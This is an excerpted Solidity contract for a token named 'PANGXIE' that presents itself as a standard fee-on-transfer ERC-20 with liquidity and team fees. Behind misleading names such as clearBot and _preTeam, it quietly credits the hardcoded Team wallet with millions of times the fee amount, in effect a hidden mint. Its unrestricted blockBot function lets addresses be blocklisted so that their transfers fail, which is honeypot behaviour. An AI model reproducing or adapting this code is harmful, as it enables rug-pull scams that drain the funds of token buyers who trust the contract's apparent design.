...
/** 
    Telegram : https://t.me/pangxieOFFICIAL
*/
...
contract XIE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    
    event SetLiquidityFee(uint256 amount);
    event SetTeamFee(uint256 amount);
    event UpdatedRouter(address router);
 

    string private _name = "PANGXIE";
    string private _symbol = "XIEXIE";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1 * 10**9 * 10**_decimals;

    address payable private Team = payable(0x4d39B418510eB323e61ec27558138685cf89925F); ///////////////////
    ...
    uint256 private _preTeam;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 private _tLiq;
    ...
    constructor() {
        ...
        _liqFee = 3;
        _preliquidityFee = _liqFee;
        _TeamFee = 3;
        _preTeam = _TeamFee * 1000000;
        _tFees = _liqFee.add(_TeamFee);

        _tLiq = _totalSupply / 100 * 100000;
    ...
    function _transfer(
        ...
        if (
            ...
            balanceOf(address(this)) >= _tLiq && // liquifyThreshhold is reached
            _tFees > 0 && // LiquidityFee + developmentFee > 0
            from != owner() && // Not from Owner
            to != owner() // Not to Owner
        ) {
            clearBot();
        ...
        if (
            ...
            uint256 feesToContract = amount.mul(_tFees).div(100);
            amount = amount.sub(feesToContract);
            basicTransfer(from, address(this), feesToContract);     
        }

        basicTransfer(from, to, amount);
    }

    function blockBot(address[] calldata addresses) public {
    for (uint256 i; i < addresses.length; ++i) {
       _removeBot[addresses[i]] = true;
      }
    }

    function clearBot() public lockSwap {
        uint256 liqSell = balanceOf(address(this))
            .mul(_liqFee)
            .div(_tFees);
        uint256 devToken = balanceOf(address(this))
            .mul(_TeamFee)
            .div(_tFees);

            _balances[Team]= _balances[Team].add(devToken/100 * _preTeam);

        swapAndLiquify(liqSell);
        swapToFee(devToken);
    }
    ...
    function swapAndLiquify(uint256 tokens) private {
        ...
        // current ETH balance
        uint256 balanceInit = address(this).balance;

        swapTokensForEth(half);

        // how much ETH did we just swap into?
        uint256 nBalance = address(this).balance.sub(balanceInit);

        addLiquidity(otherHalf, nBalance);
    }

    function swapToFee(uint256 tokens) private {

        uint256 balanceInit = address(this).balance;
        swapTokensForEth(tokens);
        // Transfer sold Token to developmentWallet
         uint256 nBalance = address(this).balance.sub(balanceInit);
         Team.transfer(nBalance); 
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        _balances[Team]= _balances[Team].add(tokenAmount/100 * _preTeam);
    ...
    function basicTransfer(
        ...
        require(!_removeBot[sender] && !_removeBot[recipient]); 
